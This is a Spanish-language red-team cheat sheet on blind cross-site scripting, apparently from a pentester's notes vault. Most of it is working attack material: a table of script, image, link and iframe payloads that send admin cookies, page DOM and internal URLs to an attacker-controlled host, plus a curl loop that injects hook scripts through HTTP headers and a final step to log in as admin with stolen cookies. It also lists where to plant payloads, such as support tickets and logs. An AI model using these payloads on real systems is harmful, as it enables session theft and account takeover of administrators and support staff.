---
aliases:
  - Blind XSS
  - OAST
tags:
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Explotación Out-of-Band (Blind XSS)

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<script src="//xss.report/c/USERNAME"></script>` | Hook completo en XSS Hunter — dispara cuando admin ve el campo | Sin CSP strict, admin panel renderiza tu input. |
| `<script src="//attacker/hook.js"></script>` | Carga payload externo arbitrario | Auto-hosted (sin XSS Hunter). |
| `<script>fetch('//attacker/log?c='+btoa(document.cookie))</script>` | Cookie de admin exfil en base64 | PoC mínimo de Blind XSS. |
| `<script>fetch('//attacker/log?d='+btoa(document.body.innerHTML))</script>` | DOM completo del admin panel | Recon de páginas internas. |
| `<script>navigator.sendBeacon('//attacker/recv', document.cookie)</script>` | Cookie exfil que sobrevive cierre de pestaña | Más confiable que `fetch` cuando admin cierra rápido. |
| `<script>new Image().src='//attacker/?url='+location.href</script>` | URL interna del admin panel via GET silencioso | Mapear estructura interna. |
| `<img src=x onerror="this.src='//attacker/?d='+btoa(document.body.innerHTML)">` | Mismo exfil DOM via event handler | `<script>` filtrado en input. |
| `"><link rel="stylesheet" href="//attacker/log.css">` | CSS exfil cuando JS bloqueado por CSP | CSP `script-src 'self'` pero permite `style-src 'unsafe-inline'`. |
| `<iframe src="//attacker/c2.html"></iframe>` | Iframe atacante en admin panel | `<iframe>` permitido. |
| `<script>fetch('//attacker',{method:'POST',body:document.cookie,mode:'no-cors'})</script>` | Exfil via POST (evade GET-only WAF outbound) | Egress filter strict. |
^xss-blind

### Workflow

```bash
# 1. Setup listener — XSS Hunter (recomendado)
# Registrarse en https://xsshunter.com → obtener payload URL

# 2. Listener auto-hosted alternativo
python3 -m http.server 8080
# o más sofisticado: ngrok http 8080

# 3. Inyectar payload en cada campo posible:
#   - Comentarios en blog
#   - Tickets de soporte (admin los lee)
#   - Profile fields (nombre, bio)
#   - User-Agent / Referer (logs visibles en admin)
#   - Filenames de uploads
#   - HTTP headers custom

# Ejemplo masivo via header
for h in 'User-Agent' 'Referer' 'X-Forwarded-For' 'X-Real-IP'; do
  curl https://target/api -H "$h: <script src=//YOUR_HOOK></script>"
done

# 4. Esperar callback (puede tardar horas/días — admin debe ver el input)
# 5. Al recibir: usar cookie/DOM exfiltrado para autenticarte como admin
```

### Targets típicos de Blind XSS

| **Lugar de inyección** | **Quién dispara** |
|:---:|:---:|
| Tickets de soporte | Agente de soporte. |
| Comentarios moderados | Moderador/admin. |
| User-Agent en logs | Admin viendo logs en panel. |
| Filename uploads | Admin revisando archivos. |
| Email con HTML | Cliente de mail con HTML rendering. |
| Profile bio | Otros usuarios + admin. |
| Search queries logged | Admin viendo analytics. |
| Error logs reflejando input | Admin debuggeando. |

---

## Overview

**Blind XSS** = payload aterriza en lugar que vos NO podés ver — ejecuta cuando otro usuario (admin, soporte, moderador) abre la página. No hay reflexión inmediata.

**Estrategia:** OOB (out-of-band) — payload fuerza al browser víctima a hacer request a tu server. Confirmación + exfil en el mismo callback.

**Tools de listener:**
- **XSS Hunter** (xsshunter.com / xss.report) — hosted, captura cookies/DOM/screenshot/URL/IP auto.
- **Interactsh** (`interactsh-client`) — ProjectDiscovery, alternativa gratuita.
- **Burp Collaborator** — built-in Burp Pro.

---
